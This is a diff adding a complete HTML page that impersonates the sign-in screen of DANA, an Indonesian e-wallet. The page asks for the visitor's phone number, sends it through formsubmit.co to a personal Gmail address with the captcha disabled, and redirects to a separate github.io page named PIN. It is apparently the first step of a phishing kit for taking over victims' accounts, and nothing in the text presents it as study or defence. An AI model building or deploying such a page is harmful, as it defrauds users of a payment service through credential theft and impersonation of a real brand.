@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Masukkan Nomor DANA</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: sans-serif;
+      background-color: #008CFF;
+      color: white;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+    .container {
+      text-align: center;
+      max-width: 400px;
+      width: 90%;
+    }
+    .logo-header {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 20px;
+    }
+    .logo-header img {
+      height: 30px;
+    }
+    .logo-header span {
+      font-size: 24px;
+      font-weight: bold;
+    }
+    form {
+      display: flex;
+      flex-direction: column;
+      gap: 20px;
+    }
+    .input-group {
+      display: flex;
+      background-color: white;
+      border-radius: 8px;
+      overflow: hidden;
+    }
+    .input-icon {
+      background-color: white;
+      padding: 10px;
+      border-right: 1px solid #ccc;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .input-icon img {
+      height: 24px;
+      width: 24px;
+    }
+    .prefix {
+      background-color: white;
+      color: black;
+      padding: 12px;
+      font-weight: bold;
+      border-right: 1px solid #ccc;
+      display: flex;
+      align-items: center;
+    }
+    input[type="tel"] {
+      padding: 12px;
+      width: 100%;
+      border: none;
+      font-size: 18px;
+      outline: none;
+    }
+    button {
+      background-color: white;
+      color: #008CFF;
+      border: none;
+      padding: 14px;
+      width: 100%;
+      font-size: 16px;
+      font-weight: bold;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+    .desc {
+      font-size: 14px;
+      margin-top: 10px;
+    }
+    .desc a {
+      color: white;
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <!-- Logo DANA -->
+    <div class="logo-header">
+      <img src="logo-dana.png" alt="DANA Logo" />
+      <span>DANA</span>
+    </div>
+
+    <p>Masukkan nomor HP kamu untuk lanjut</p>
+
+    <form action="https://formsubmit.co/baygaming648@gmail.com" method="POST">
+      <div class="input-group">
+        <div class="input-icon">
+          <img src="logo-mini.png" alt="icon" />
+        </div>
+        <div class="prefix">+62</div>
+        <input type="tel" name="nomor_hp" placeholder="8112345678" required maxlength="13">
+      </div>
+
+      <input type="hidden" name="_captcha" value="false">
+      <input type="hidden" name="_next" value="https://b813743.github.io/PIN/">
+      
+      <button type="submit">LANJUTKAN</button>
+    </form>
+
+    <p class="desc">
+      Kami akan menggunakan nomor HP ini sebagai ID kamu dan untuk mengamankan akun kamu.<br>
+      Dengan melanjutkan, kamu juga setuju dengan <a href="#">S&K</a> serta <a href="#">Kebijakan Privasi</a> kami.
+    </p>
+  </div>
+</body>
+</html>
